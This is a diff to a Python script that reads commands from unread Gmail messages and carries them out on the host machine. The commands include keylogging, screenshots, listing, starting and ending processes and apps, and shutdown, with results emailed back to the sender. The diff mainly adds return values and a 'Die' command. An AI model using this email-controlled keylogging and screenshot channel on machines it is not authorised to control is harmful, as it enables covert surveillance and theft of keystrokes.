@@ -94,12 +94,15 @@ def process_email(sender_email, body):
 
     if body.find("KeyLog", start, end) != -1:
         key_log(sender_email, body, start, end)
+        return "KeyLog"
 
     if body.find("ListApp", start, end) != -1:
         sendMail.send_process_email(sender_email)
+        return "ListApp"
 
     if body.find("Screenshot", start, end) != -1:
         sendMail.send_screenshot_email(sender_email)
+        return "Screenshot"
 
     if body.find("Shut Down", start, end) != -1:
         power_controller = powerController.powerController()
@@ -111,18 +114,26 @@ def process_email(sender_email, body):
 
     if body.find("ListProcess", start, end) != -1:
         sendMail.send_bgProcess_email(sender_email)
+        return "ListProcess"
 
     if body.find("StartProcess", start, end) != -1:
         start_process(sender_email, body)
+        return "StartProcess"
 
     if body.find("EndProcess", start, end) != -1:
         end_process(sender_email, body)
+        return "EndProcess"
 
     if body.find("StartApp", start, end) != -1:
         start_app(sender_email, body)
+        return "StartApp"
 
     if body.find("EndApp", start, end) != -1:
-        end_app()(sender_email, body)
+        end_app(sender_email, body)
+        return "EndApp"
+
+    if body.find("Die", start, end) != -1:
+        return "Die"
 
 def read_email():
     # Gmail account credentials
@@ -142,7 +153,7 @@ def read_email():
     status, email_ids = imap.search(None, 'UNSEEN')
     if not email_ids[0]:
         print("No unread emails found.")
-        return
+        return "Error"
     latest_email_id = email_ids[0].split()[-1]
 
     # Fetch the email message by ID
@@ -152,10 +163,11 @@ def read_email():
     sender_email, body = extract_email_information(email_data[0][1])
 
     # Process email
-    process_email(sender_email, body)
+    command = process_email(sender_email, body)
 
     # Close the connection
     imap.logout()
+    return command
 
 if __name__ == "__main__":
     # Process the 1st unread email
